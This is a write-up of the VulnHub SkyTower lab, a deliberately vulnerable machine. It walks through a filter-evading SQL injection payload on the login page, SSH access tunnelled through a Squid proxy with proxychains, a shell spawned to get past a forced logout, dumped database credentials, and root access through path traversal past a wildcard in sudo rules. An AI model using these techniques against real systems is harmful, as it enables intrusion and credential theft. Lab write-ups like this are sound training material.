
# SkyTower - VulnHub Write-up

## Recon

**Open Ports:**
```
22 (SSH)
80 (HTTP)
3128 (Squid Proxy)
```

A login page is exposed on port 80.

---

## Initial Foothold – SQL Injection

Automated tools like `sqlmap` failed because the server filters keywords and symbols such as:

```
SELECT, OR, =, -
```

### Bypass Technique

Original payload:
```
' OR 1=1 --
```

Modified payload:
- `OR` → `||`
- `1=1` → `1<2`
- `--` → `#`

Final payload:
```
'||1<2#
```

### Credentials Found
```
Username: john
Password: hereisjohn
```

---

## SSH via Squid Proxy

Direct SSH access is blocked, but Squid proxy is available on port 3128.

### Configure ProxyChains

```
sudo nano /etc/proxychains4.conf
```

Add:
```
http 10.0.3.9 3128
```

### Connect

```
proxychains ssh john@10.0.3.9
```

SSH connects but immediately exits.

---

## Bypass Forced Logout

The `.bashrc` file forces logout on login.

### Spawn Shell Directly

```
proxychains4 ssh john@10.0.3.9 -t "/bin/sh"
```

---

## Database Enumeration

Found credentials in:

```
/var/www/login.php
```

### MySQL Credentials
```
Username: root
Password: root
```

### Dumped Data

```
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
```

---

## Stabilizing Access

Removed the `exit` from `.bashrc` to allow normal SSH login.

---

## Privilege Escalation

Switched to user `sara`.

### Sudo Permissions

```
User sara may run the following commands on this host:
(root) NOPASSWD: /bin/cat /accounts/*
(root) /bin/ls /accounts/*
```

---

## Exploiting Wildcard

The wildcard `*` allows path traversal.

### List Root Directory

```
sudo ls /accounts/../root/
```

### Read Root Flag

```
sudo cat /accounts/../root/flag.txt
```

Output:
```
Congratz, have a cold one to celebrate!
root password is theskytower
```

---

## Root Access

```
su root
```

---
